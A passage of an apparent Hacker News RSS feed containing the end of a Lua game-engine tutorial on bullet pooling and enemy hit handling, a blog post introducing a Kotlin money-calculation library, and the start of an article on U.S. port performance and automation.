</code></pre></div>
<p>It’s not a triple-A title, but I’m very careful with resource management. A widely known technique is to create an object pool that you can reuse. In the code below, we limit it to a maximum of 3 bullets present on the screen.</p>
<p>The on_update method is a callback called each loop in the engine. In the case of the bullet, I check if it has approached the green octopus. If so, I send a message to it indicating that it received a hit.</p>
<div><pre><code><span>for</span> <span>_</span> <span>=</span> <span>1</span><span>,</span> <span>3</span> <span>do</span>
  <span>local</span> <span>bullet</span> <span>=</span> <span>engine</span><span>:</span><span>spawn</span><span>(</span><span>"bullet"</span><span>)</span>
  <span>bullet</span><span>:</span><span>set_placement</span><span>(</span><span>-</span><span>128</span><span>,</span> <span>-</span><span>128</span><span>)</span>
  <span>bullet</span><span>:</span><span>on_update</span><span>(</span><span>function</span><span>(</span><span>self</span><span>)</span>
    <span>if</span> <span>self</span><span>.</span><span>x</span> <span>&gt;</span> <span>1200</span> <span>then</span>
      <span>postal</span><span>:</span><span>post</span><span>(</span><span>Mail</span><span>.</span><span>new</span><span>(</span><span>0</span><span>,</span> <span>"bullet"</span><span>,</span> <span>"hit"</span><span>))</span> <span>-- id 0 is the octopus</span>
      <span>bullet</span><span>:</span><span>unset_action</span><span>()</span>
      <span>bullet</span><span>:</span><span>set_placement</span><span>(</span><span>-</span><span>128</span><span>,</span> <span>-</span><span>128</span><span>)</span> <span>-- move to ouside the screen</span>
      <span>table.insert</span><span>(</span><span>bullet_pool</span><span>,</span> <span>bullet</span><span>)</span> <span>-- back to the pool</span>
    <span>end</span>
  <span>end</span><span>)</span>
  <span>table.insert</span><span>(</span><span>bullet_pool</span><span>,</span> <span>bullet</span><span>)</span>
<span>end</span>
</code></pre></div>
<p>On the octopus’s side, when it receives a “hit” message, the entity triggers an explosion animation, switches to attack mode, and decreases its health by 1. If it reaches 0, it changes the animation to “dead”.</p>
<div><pre><code><span>octopus</span><span>:</span><span>set_action</span><span>(</span><span>"idle"</span><span>)</span>
<span>octopus</span><span>:</span><span>set_placement</span><span>(</span><span>1200</span><span>,</span> <span>620</span><span>)</span>
<span>octopus</span><span>:</span><span>on_mail</span><span>(</span><span>function</span><span>(</span><span>self</span><span>,</span> <span>message</span><span>)</span>
  <span>if</span> <span>message</span> <span>==</span> <span>'hit'</span> <span>then</span>
    <span>bomb</span><span>()</span>
    <span>octopus</span><span>:</span><span>set_action</span><span>(</span><span>"attack"</span><span>)</span>
    <span>life</span> <span>=</span> <span>life</span> <span>-</span> <span>1</span>
    <span>if</span> <span>life</span> <span>&lt;=</span> <span>0</span> <span>then</span>
      <span>self</span><span>:</span><span>set_action</span><span>(</span><span>"dead"</span><span>)</span>
    <span>end</span>
  <span>end</span>
<span>end</span><span>)</span>
</code></pre></div>
<p>And finally, the player’s <code>on_update</code>, where I apply the velocity if any movement keys are pressed, or set the animation to idle if none are pressed.</p>
<p>We also have the projectile firing, where the fire function is called, taking an instance of a bullet from the pool, placing it in a semi-random position, and applying velocity.</p>
<div><pre><code><span>local</span> <span>function</span> <span>fire</span><span>()</span>
  <span>if</span> <span>#</span><span>bullet_pool</span> <span>&gt;</span> <span>0</span> <span>then</span>
    <span>local</span> <span>bullet</span> <span>=</span> <span>table.remove</span><span>(</span><span>bullet_pool</span><span>)</span>
    <span>local</span> <span>x</span> <span>=</span> <span>(</span><span>player</span><span>.</span><span>x</span> <span>+</span> <span>player</span><span>.</span><span>size</span><span>.</span><span>width</span><span>)</span> <span>-</span> <span>30</span>
    <span>local</span> <span>y</span> <span>=</span> <span>player</span><span>.</span><span>y</span> <span>+</span> <span>30</span>
    <span>local</span> <span>offset_y</span> <span>=</span> <span>(</span><span>math.random</span><span>(</span><span>-</span><span>2</span><span>,</span> <span>2</span><span>))</span> <span>*</span> <span>20</span>

    <span>bullet</span><span>:</span><span>set_placement</span><span>(</span><span>x</span><span>,</span> <span>y</span> <span>+</span> <span>offset_y</span><span>)</span>
    <span>bullet</span><span>:</span><span>set_velocity</span><span>(</span><span>Vector2D</span><span>.</span><span>new</span><span>(</span><span>0</span><span>.</span><span>6</span><span>,</span> <span>0</span><span>))</span>
    <span>bullet</span><span>:</span><span>set_action</span><span>(</span><span>"default"</span><span>)</span>

    <span>local</span> <span>sound</span> <span>=</span> <span>"bomb"</span> <span>..</span> <span>math.random</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span>
    <span>soundmanager</span><span>:</span><span>play</span><span>(</span><span>sound</span><span>)</span>
  <span>end</span>
<span>end</span>

<span>player</span><span>:</span><span>on_update</span><span>(</span><span>function</span><span>(</span><span>self</span><span>)</span>
  <span>local</span> <span>velocity</span> <span>=</span> <span>Vector2D</span><span>.</span><span>new</span><span>(</span><span>0</span><span>,</span> <span>0</span><span>)</span>

  <span>if</span> <span>engine</span><span>:</span><span>is_keydown</span><span>(</span><span>KeyEvent</span><span>.</span><span>space</span><span>)</span> <span>then</span>
    <span>if</span> <span>not</span> <span>shooting</span> <span>then</span>
      <span>fire</span><span>()</span>
      <span>shooting</span> <span>=</span> <span>true</span>
    <span>end</span>
  <span>else</span>
    <span>shooting</span> <span>=</span> <span>false</span>
  <span>end</span>

  <span>if</span> <span>engine</span><span>:</span><span>is_keydown</span><span>(</span><span>KeyEvent</span><span>.</span><span>a</span><span>)</span> <span>then</span>
    <span>velocity</span><span>.</span><span>x</span> <span>=</span> <span>-</span><span>.</span><span>4</span>
  <span>elseif</span> <span>engine</span><span>:</span><span>is_keydown</span><span>(</span><span>KeyEvent</span><span>.</span><span>d</span><span>)</span> <span>then</span>
    <span>velocity</span><span>.</span><span>x</span> <span>=</span> <span>.</span><span>4</span>
  <span>end</span>

  <span>if</span> <span>velocity</span><span>:</span><span>moving</span><span>()</span> <span>then</span>
    <span>self</span><span>:</span><span>set_action</span><span>(</span><span>"run"</span><span>)</span>
    <span>if</span> <span>velocity</span><span>:</span><span>left</span><span>()</span> <span>then</span>
      <span>self</span><span>:</span><span>set_flip</span><span>(</span><span>Flip</span><span>.</span><span>horizontal</span><span>)</span>
    <span>else</span>
      <span>self</span><span>:</span><span>set_flip</span><span>(</span><span>Flip</span><span>.</span><span>none</span><span>)</span>
    <span>end</span>
  <span>elseif</span> <span>velocity</span><span>:</span><span>zero</span><span>()</span> <span>then</span>
    <span>self</span><span>:</span><span>set_action</span><span>(</span><span>"idle"</span><span>)</span>
  <span>end</span>

  <span>self</span><span>:</span><span>set_velocity</span><span>(</span><span>velocity</span><span>)</span>
<span>end</span><span>)</span>
</code></pre></div>
</article>

</main>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Kotlin Money (368 pts)]]></title>
            <link>https://blog.eriksen.com.br/en/introducing-kotlin-money</link>
            <guid>41776878</guid>
            <pubDate>Tue, 08 Oct 2024 12:59:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.eriksen.com.br/en/introducing-kotlin-money">https://blog.eriksen.com.br/en/introducing-kotlin-money</a>, See on <a href="https://news.ycombinator.com/item?id=41776878">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
    <p>Manipulating monetary amounts is a common computing chore. However, no mainstream language has a first-class data type for representing money, it’s up to programmers to code abstractions for it. This isn’t an issue per se until dealing with rounding issues from operations like installment payments (e.g., buy now, pay later), foreign exchange, or even simple things like fee processing and tax collection.</p>

<p>Inspired by my days at <a href="https://blog.eriksen.com.br/en/platform-engineering-n26">N26</a> dealing with these challenges, I introduce <a href="https://github.com/eriksencosta/money/">Money</a>: a Kotlin library that makes monetary calculations and allocations easy:</p>

<pre><code>val price = 100 money "USD"                     // USD 100.00
val shipping = 5 money "USD"                    // USD 5.00
val subtotal = price + shipping                 // USD 105.00
val discount = 10.percent()                     // 10%
val total = subtotal decreaseBy discount        // USD 94.50

val ratios = listOf(60.percent(), 40.percent()) // [60%, 40%]

total allocate 2                                // [USD 47.25, USD 47.25]
total allocate ratios                           // [USD 56.70, USD 37.80]
</code></pre>

<p>The library supports mathematical operations with monetary amounts, calculations with percentages, and allocation, making it simple to model use cases like those mentioned. Cryptocurrencies are also fully supported out of the box:</p>

<pre><code>val price = 0.01607580 money "BTC"           // BTC 0.01607580
val transactionFee = 1.25.percent()          // 1.25%
val total = price increaseBy transactionFee  // BTC 0.01627675
val installments = total allocate 3          // [BTC 0.00542559, BTC 0.00542558, BTC 0.00542558]

val rate = 62_555.60 money "USD"             // USD 62555.60
val totalInUsd = total exchange rate         // USD 1005.63
</code></pre>

<h2 id="allocation">Allocation</h2>

<p>One of the nicest features of the library is its allocation capability. Allocation allows the distribution of a monetary amount into parts while guaranteeing that the sum of the parts equals the original value. For example, a retailer may accept purchases by credit card installments or by buy now, pay later (BNPL). What happens when a customer makes a purchase totaling USD 100.00 to be paid in three installments?</p>

<pre><code>val price = 100 money "USD"
val number = 3
val installment = price / number
val installments = List(number) { installment } // [USD 33.33, USD 33.33, USD 33.33]
val total = installments.sum()                  // USD 99.99
</code></pre>

<p>As you noticed, there is a loss of USD 0.01. A penny here and there may seem a slight loss, but it may be <a href="https://slate.com/technology/2019/10/round-floor-software-errors-stock-market-battlefield.html">costly over time</a>. But there are other complications as well, such as overcharging a customer (which can be an infringement of consumer rights in several countries) due to rounding issues. The library provides a handy <code>allocate()</code> method that guarantees the result won’t differ from the original amount:</p>

<pre><code>val price = 100 money "USD"
val installments = price allocate 3          // [USD 33.34, USD 33.33, USD 33.33]
val total = installments.allocations().sum() // USD 100.00
</code></pre>

<p>To allocate in proportional parts, pass a list of <code>Percentage</code> values to the method:</p>

<pre><code>val amount = 2345.89 money "USD"
val result = dueAmount allocate listOf(50.percent(), 30.percent(), 20.percent())
val allocations = result.allocations() // [USD 1172.94, USD 703.77, USD 469.18]
val total = allocations.sum()          // USD 2345.89
</code></pre>

<p>As you can see in the previous examples, both results totaled up to the original monetary amount. No cent was lost or gained. By default, the library automatically allocates the difference. But you can tweak how the difference is allocated in the allocations list. For example, suppose your company requires the difference to be always allocated to the last item. You can do it by creating the allocator object directly with the desired allocation strategy:</p>

<pre><code>val price = 100 money "USD"
val allocator = EvenAllocator(OnLast)
val installments = allocator.allocate(price, 3) // [USD 33.33, USD 33.33, USD 33.34]
val total = installments.allocations().sum()    // USD 100.00
</code></pre>

<h2 id="wrapping-up">Wrapping up</h2>

<p>This post is just a glimpse of the library’s capabilities. I intend to keep the library’s API concise and to expand its capabilities gradually, including supporting Android development and out of the box persistence and serialization. Nevertheless, I hope it’s useful in its current version for people manipulating monetary amounts in Kotlin projects.</p>

<p>Refer to the <a href="https://github.com/eriksencosta/money/tree/trunk/docs/usage">usage guide</a> on how to work with Money. The library has built-in support for <a href="https://github.com/eriksencosta/money/blob/trunk/docs/appendixes/circulating-currencies.md">306 circulating currencies</a> and <a href="https://github.com/eriksencosta/money/blob/trunk/docs/appendixes/cryptocurrencies.md">2283 cryptocurrencies</a>. The <a href="https://github.com/eriksencosta/money/#installation">installation procedures</a> are explained in the project’s README. Give it a shot!</p>

<!-- Links. -->



    
      <h2>References</h2>
      
<ul>

  <li>
    <a id=""></a>
    

    <a href="https://blog.eriksen.com.br/en/platform-engineering-n26">Platform engineering at N26: how we planned and launched it</a>

    
  </li>

  <li>
    <a id=""></a>
    

    <a href="https://github.com/eriksencosta/money">Money: Project repository</a>

    
  </li>

  <li>
    <a id=""></a>
    Slate. Lav Varshney, 2019.

    <a href="https://slate.com/technology/2019/10/round-floor-software-errors-stock-market-battlefield.html">The Deadly Consequences of Rounding Errors</a>

    
  </li>

  <li>
    <a id=""></a>
    

    <a href="https://github.com/eriksencosta/money/tree/trunk/docs/usage">Money: Usage guide</a>

    
  </li>

  <li>
    <a id=""></a>
    

    <a href="https://github.com/eriksencosta/money/blob/trunk/docs/appendixes/circulating-currencies.md">Money: Circulating currencies</a>

    
  </li>

  <li>
    <a id=""></a>
    

    <a href="https://github.com/eriksencosta/money/blob/trunk/docs/appendixes/cryptocurrencies.md">Money: Cryptocurrencies</a>

    
  </li>

  <li>
    <a id=""></a>
    

    <a href="https://github.com/eriksencosta/money/#installation">Money: Installation procedures</a>

    
  </li>

</ul>


    
  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Do U.S. ports need more automation? (187 pts)]]></title>
            <link>https://www.construction-physics.com/p/do-us-ports-need-more-automation</link>
            <guid>41776861</guid>
            <pubDate>Tue, 08 Oct 2024 12:57:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.construction-physics.com/p/do-us-ports-need-more-automation">https://www.construction-physics.com/p/do-us-ports-need-more-automation</a>, See on <a href="https://news.ycombinator.com/item?id=41776861">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p><span>On October 1st, 47,000 members of the International Longshoremen's Association (ILA), primarily dockworkers on East and Gulf Coast ports, went on strike after failing to agree contract terms with </span><a href="https://www.usmx.com/" rel="">USMX</a><span>, an alliance of port operators and employers. (West Coast ports, which are worked by a different union, the International Longshore and Warehouse Union, remained open.) Along with higher pay, the main point of disagreement was automation; the ILA demanded a </span><a href="https://en.wikipedia.org/wiki/2024_United_States_port_strike" rel="">complete ban</a><span> on introducing new port automation. The strike ended on October 3rd with a tentative agreement on wage increases, but </span><a href="https://abcnews.go.com/US/dockworkers-strike-suspended-sources/story?id=114445386" rel="">negotiations over automation</a><span> will continue until January 15th.</span></p><p><span>The strike sparked a discussion about the quality of U.S. ports, and the degree they need to be automated to improve their performance. Most folks have (reasonably) assumed that the union is holding back port automation that would improve productivity. In the 1960s, dockworkers unions vehemently protested against introducing the productivity-enhancing shipping container, and current ILA president Harold Daggett has complained about </span><a href="https://nypost.com/2024/10/02/business/union-boss-harold-daggett-rages-against-e-zpass-for-costing-union-jobs-in-video-weeks-before-strike-shut-down-ports/" rel="">EZ passes for highway tolls</a><span> eliminating union jobs. The ILA’s case has not been helped by the extremely high wages of longshoremen (and of Daggett), the </span><a href="https://www.instagram.com/reel/DAj5A3-SfYn/" rel="">video of Daggett</a><span> threatening to “cripple” the entire economy, or the fact that Daggett is alleged to have </span><a href="https://www.telegraph.co.uk/us/news/2024/10/01/harold-daggett-union-leader-fought-allegations-mob-ties/" rel="">connections to organized crime</a><span>.</span></p><p>But despite Daggett and the ILA doing everything in their power to turn people against their cause, the case for port automation isn’t straightforward. It is true that U.S. ports perform poorly compared to ports around the world, but it’s hard to blame this entirely on a lack of automation. Few ports around the world are automated, and the most heavily automated ports (including in the U.S.) don’t necessarily perform the best. Lack of automation may be partly behind poor American port performance, but there are many other factors as well.</p><p><span>Since 2020, the World Bank has released a </span><a href="https://openknowledge.worldbank.org/entities/publication/87d77e6d-6b7b-4bbe-b292-ae0f3b4827e8" rel="">Container Port Performance Index</a><span>, which ranks ports around the world based on how long vessels stay in port. Since a ship waiting in port isn’t making money by transporting cargo, shipowners want them in and out of ports as quickly as possible. Major American ports routinely rank near the bottom of this list. Los Angeles, the largest port in the U.S. by container volume, ranked #375 in 2023, and Long Beach (the second-largest) ranked #373. Savannah ranked #395, and Seattle ranked #360. Of the five largest American container ports, only New York-New Jersey cracked the top 100 (at #92). On average, per this index the U.S. has the worst-performing ports of any country in the world.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ecd19f8-4dfa-437b-82b0-8f25f0fc699b_590x287.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ecd19f8-4dfa-437b-82b0-8f25f0fc699b_590x287.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ecd19f8-4dfa-437b-82b0-8f25f0fc699b_590x287.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ecd19f8-4dfa-437b-82b0-8f25f0fc699b_590x287.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ecd19f8-4dfa-437b-82b0-8f25f0fc699b_590x287.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ecd19f8-4dfa-437b-82b0-8f25f0fc699b_590x287.png" width="590" height="287" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/3ecd19f8-4dfa-437b-82b0-8f25f0fc699b_590x287.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:287,&quot;width&quot;:590,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ecd19f8-4dfa-437b-82b0-8f25f0fc699b_590x287.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ecd19f8-4dfa-437b-82b0-8f25f0fc699b_590x287.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ecd19f8-4dfa-437b-82b0-8f25f0fc699b_590x287.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3ecd19f8-4dfa-437b-82b0-8f25f0fc699b_590x287.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a><figcaption>Via UNCTAD.</figcaption></figure></div><p>Other measures of port performance show the same thing. It takes roughly two to three times as long to move a container in a U.S. port as a Chinese port, and U.S. ports are slower than ports in most other major shipping countries.</p><p>The U.S. does better on bulk cargo and tanker handling, but only manages to be average or somewhat below average in cargo loading/unloading rates and ship waiting times.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fac1b84cc-4146-4722-b1d3-d936e03ed4f9_858x705.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fac1b84cc-4146-4722-b1d3-d936e03ed4f9_858x705.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fac1b84cc-4146-4722-b1d3-d936e03ed4f9_858x705.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fac1b84cc-4146-4722-b1d3-d936e03ed4f9_858x705.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fac1b84cc-4146-4722-b1d3-d936e03ed4f9_858x705.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fac1b84cc-4146-4722-b1d3-d936e03ed4f9_858x705.png" width="858" height="705" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/ac1b84cc-4146-4722-b1d3-d936e03ed4f9_858x705.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:705,&quot;width&quot;:858,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fac1b84cc-4146-4722-b1d3-d936e03ed4f9_858x705.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fac1b84cc-4146-4722-b1d3-d936e03ed4f9_858x705.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fac1b84cc-4146-4722-b1d3-d936e03ed4f9_858x705.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fac1b84cc-4146-4722-b1d3-d936e03ed4f9_858x705.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Via UNCTAD.</figcaption></figure></div><p>This situation is not new. Since at least the 2010s, American container ports have been substantially less productive than ports in Southeast Asia.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5644fe12-95bf-42bb-aeb3-5c724ea0b944_555x344.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5644fe12-95bf-42bb-aeb3-5c724ea0b944_555x344.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5644fe12-95bf-42bb-aeb3-5c724ea0b944_555x344.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5644fe12-95bf-42bb-aeb3-5c724ea0b944_555x344.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5644fe12-95bf-42bb-aeb3-5c724ea0b944_555x344.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5644fe12-95bf-42bb-aeb3-5c724ea0b944_555x344.png" width="555" height="344" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/5644fe12-95bf-42bb-aeb3-5c724ea0b944_555x344.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:344,&quot;width&quot;:555,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5644fe12-95bf-42bb-aeb3-5c724ea0b944_555x344.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5644fe12-95bf-42bb-aeb3-5c724ea0b944_555x344.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5644fe12-95bf-42bb-aeb3-5c724ea0b944_555x344.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5644fe12-95bf-42bb-aeb3-5c724ea0b944_555x344.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Via JOC.</figcaption></figure></div><p>However, it’s not clear how much this can be blamed on automation.</p><p>When we talk about port automation, we’re really talking about a collection of different tasks, which can be automated to different degrees. We can broadly break container handling automation into three different groups: ship- or quay-side tasks, yard tasks, and land-side tasks. The first are tasks required to move containers from the ship onto the shore, the second are tasks required to move containers around the storage yard, and the third are tasks required to move containers out of the port via land-based transport.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8149d67-edf1-4d93-a8ea-dc668339b1ba_1407x880.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8149d67-edf1-4d93-a8ea-dc668339b1ba_1407x880.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8149d67-edf1-4d93-a8ea-dc668339b1ba_1407x880.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8149d67-edf1-4d93-a8ea-dc668339b1ba_1407x880.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8149d67-edf1-4d93-a8ea-dc668339b1ba_1407x880.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8149d67-edf1-4d93-a8ea-dc668339b1ba_1407x880.png" width="1407" height="880" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/c8149d67-edf1-4d93-a8ea-dc668339b1ba_1407x880.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:880,&quot;width&quot;:1407,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8149d67-edf1-4d93-a8ea-dc668339b1ba_1407x880.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8149d67-edf1-4d93-a8ea-dc668339b1ba_1407x880.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8149d67-edf1-4d93-a8ea-dc668339b1ba_1407x880.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8149d67-edf1-4d93-a8ea-dc668339b1ba_1407x880.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Examples of port automation, via GAO.</figcaption></figure></div><p><span>When containers are placed on a ship, they’re attached together with </span><a href="https://www.tandemloc.com/ad54000a-1ga" rel="">twistlocks</a><span> to keep them from moving around. These locks must be connected after the containers are loaded and disconnected before they can be unloaded, part of a process known as </span><a 